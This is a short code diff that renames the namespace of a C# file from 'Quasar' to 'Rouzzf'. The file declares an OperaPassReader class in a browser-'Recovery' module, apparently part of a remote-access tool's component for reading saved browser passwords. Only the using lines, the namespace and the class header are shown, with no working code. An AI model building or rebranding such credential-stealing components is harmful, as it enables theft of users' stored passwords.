@@ -1,9 +1,9 @@
-﻿using Quasar.Common.Models;
+﻿using Rouzzf.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Rouzzf.Client.Recovery.Browsers
 {
     public class OperaPassReader : ChromiumBase
     {
